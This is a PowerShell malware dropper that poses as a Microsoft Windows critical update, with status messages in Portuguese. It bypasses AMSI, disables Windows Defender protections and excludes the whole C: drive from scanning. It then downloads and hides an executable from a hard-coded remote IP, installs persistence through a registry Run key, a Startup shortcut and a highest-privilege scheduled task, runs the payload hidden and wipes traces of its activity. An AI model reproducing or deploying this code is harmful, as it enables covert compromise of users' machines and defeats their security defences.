<#
.SYNOPSIS
    Windows Critical System Component
.DESCRIPTION
    Microsoft Windows Critical Update Module
.NOTES
    Version: 10.0.19045.1
#>

$serverIP = "198.1.195.194"
$serverPort = 5000
$installName = "WinUpdateSvc"
$autoName = "GlobalMicrosoftWindowsUpdateService"

$mutexName = "Global\WindowsUpdateMutex"
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "ERRO: Execute como Administrador!" -ForegroundColor Red
    Start-Sleep -Seconds 5
    exit
}

function Get-LocalIP {
    try {
        $ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"} | Select-Object -First 1).IPAddress
        if ($ip) { return $ip }
    } catch {}
    return "Unknown"
}

function Get-SystemInfo {
    try {
        $cpu = (Get-WmiObject Win32_Processor -ErrorAction SilentlyContinue).Name
        $ram = [math]::Round((Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB, 2)
        $os = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        $user = $env:USERNAME
        $pc = $env:COMPUTERNAME
        
        Write-Host "===============================================================" -ForegroundColor Cyan
        Write-Host "SISTEMA: $user@$pc" -ForegroundColor White
        Write-Host "OS: $os" -ForegroundColor Gray
        Write-Host "CPU: $cpu" -ForegroundColor Gray
        Write-Host "RAM: $ram GB" -ForegroundColor Gray
        Write-Host "IP: $(Get-LocalIP)" -ForegroundColor Gray
        Write-Host "===============================================================" -ForegroundColor Cyan
    } catch {}
}

function Bypass-AMSI {
    try {
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        Write-Host "[OK] AMSI bypassado" -ForegroundColor Green
    } catch {
        Write-Host "[!] AMSI bypass falhou" -ForegroundColor Red
    }
}

function Disable-Defender {
    Write-Host "[+] Desabilitando Windows Defender..." -ForegroundColor Yellow
    
    $commands = @(
        "Set-MpPreference -DisableRealtimeMonitoring `$true",
        "Set-MpPreference -DisableIOAVProtection `$true",
        "Set-MpPreference -DisableBehaviorMonitoring `$true",
        "Set-MpPreference -DisableBlockAtFirstSeen `$true",
        "Add-MpPreference -ExclusionPath 'C:\'",
        "Add-MpPreference -ExclusionExtension '.exe'"
    )
    
    foreach ($cmd in $commands) {
        try {
            Invoke-Expression $cmd -ErrorAction SilentlyContinue
        } catch {}
    }
    
    Write-Host "[OK] Defender desabilitado" -ForegroundColor Green
}

function Download-Payload {
    param([string]$url, [string]$dest)
    
    Write-Host "[+] Baixando payload..." -ForegroundColor Yellow
    
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Microsoft-CryptoAPI/10.0")
        $wc.DownloadFile($url, $dest)
        
        if (Test-Path $dest) {
            $size = (Get-Item $dest).Length
            Write-Host "[OK] Download concluido: $size bytes" -ForegroundColor Green
            
            $file = Get-Item $dest -Force
            $file.Attributes = 'Hidden,System'
            
            return $true
        }
    } catch {
        Write-Host "[!] Erro no download: $_" -ForegroundColor Red
    }
    
    try {
        Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -ErrorAction Stop
        if (Test-Path $dest) {
            Write-Host "[OK] Download concluido (metodo 2)" -ForegroundColor Green
            return $true
        }
    } catch {}
    
    try {
        Start-BitsTransfer -Source $url -Destination $dest -ErrorAction Stop
        if (Test-Path $dest) {
            Write-Host "[OK] Download concluido (metodo 3)" -ForegroundColor Green
            return $true
        }
    } catch {}
    
    return $false
}

function Install-Persistence {
    param([string]$path)
    
    Write-Host "[+] Instalando persistencia..." -ForegroundColor Yellow
    
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name $autoName -Value $path -Force -ErrorAction SilentlyContinue
        Write-Host "[OK] Registry configurado" -ForegroundColor Green
        
        try {
            $startupPath = [Environment]::GetFolderPath('Startup')
            $shortcutPath = Join-Path $startupPath "$autoName.lnk"
            
            $shell = New-Object -ComObject WScript.Shell
            $shortcut = $shell.CreateShortcut($shortcutPath)
            $shortcut.TargetPath = $path
            $shortcut.WindowStyle = 7
            $shortcut.Save()
            Write-Host "[OK] Atalho criado" -ForegroundColor Green
        } catch {}
        
        try {
            $action = New-ScheduledTaskAction -Execute $path -ErrorAction Stop
            $trigger = New-ScheduledTaskTrigger -AtLogOn -ErrorAction Stop
            $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest -ErrorAction Stop
            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ErrorAction Stop
            
            Register-ScheduledTask -TaskName $autoName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
            Write-Host "[OK] Tarefa agendada criada" -ForegroundColor Green
        } catch {}
        
        return $true
    } catch {
        return $false
    }
}

function Start-Payload {
    param([string]$path)
    
    Write-Host "[+] Iniciando payload..." -ForegroundColor Yellow
    
    try {
        $pName = [System.IO.Path]::GetFileNameWithoutExtension($path)
        $existing = Get-Process -Name $pName -ErrorAction SilentlyContinue
        
        if ($existing) {
            Write-Host "[!] Payload ja em execucao (PID: $($existing.Id))" -ForegroundColor Yellow
            return $true
        }
        
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $path
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow = $true
        $psi.UseShellExecute = $false
        
        $process = [System.Diagnostics.Process]::Start($psi)
        
        Start-Sleep -Seconds 2
        
        if ($process -and !$process.HasExited) {
            Write-Host "[OK] Payload iniciado (PID: $($process.Id))" -ForegroundColor Green
            return $true
        } else {
            Write-Host "[!] Processo terminou inesperadamente" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "[!] Erro ao iniciar: $_" -ForegroundColor Red
        return $false
    }
}

function Clear-Tracks {
    Write-Host "[+] Limpando rastros..." -ForegroundColor Yellow
    
    try {
        Clear-History -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
        
        Write-Host "[OK] Rastros limpos" -ForegroundColor Green
    } catch {}
}

function Main {
    $host.UI.RawUI.WindowTitle = "Microsoft Windows Update Service"
    
    Clear-Host
    
    Write-Host ""
    Write-Host "===================================================================" -ForegroundColor Cyan
    Write-Host "    Microsoft Windows Critical System Component                    " -ForegroundColor White
    Write-Host "    Version 10.0.19045.1                                           " -ForegroundColor Gray
    Write-Host "===================================================================" -ForegroundColor Cyan
    Write-Host ""
    
    Get-SystemInfo
    Write-Host ""
    
    Bypass-AMSI
    Disable-Defender
    
    $url = "http://${serverIP}:${serverPort}/WindowsUpdate.exe"
    $dest = "$env:APPDATA\Microsoft\Windows\$installName.exe"
    
    $dir = Split-Path $dest
    if (-not (Test-Path $dir)) {
        New-Item -Path $dir -ItemType Directory -Force | Out-Null
    }
    
    if (-not (Download-Payload -url $url -dest $dest)) {
        Write-Host ""
        Write-Host "===================================================================" -ForegroundColor Red
        Write-Host "    [X] FALHA: Download nao concluido                              " -ForegroundColor Red
        Write-Host "===================================================================" -ForegroundColor Red
        Start-Sleep -Seconds 5
        return
    }
    
    Install-Persistence -path $dest | Out-Null
    
    if (-not (Start-Payload -path $dest)) {
        Write-Host ""
        Write-Host "===================================================================" -ForegroundColor Red
        Write-Host "    [X] FALHA: Nao foi possivel iniciar                            " -ForegroundColor Red
        Write-Host "===================================================================" -ForegroundColor Red
        Start-Sleep -Seconds 5
        return
    }
    
    Clear-Tracks
    
    Write-Host ""
    Write-Host "===================================================================" -ForegroundColor Green
    Write-Host "    [OK] SUCESSO: Componente instalado                              " -ForegroundColor Green
    Write-Host "===================================================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "Pressione qualquer tecla para continuar..." -ForegroundColor Gray
    
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

try {
    Main
} catch {
    Write-Host "[!] ERRO: $_" -ForegroundColor Red
    Start-Sleep -Seconds 10
}
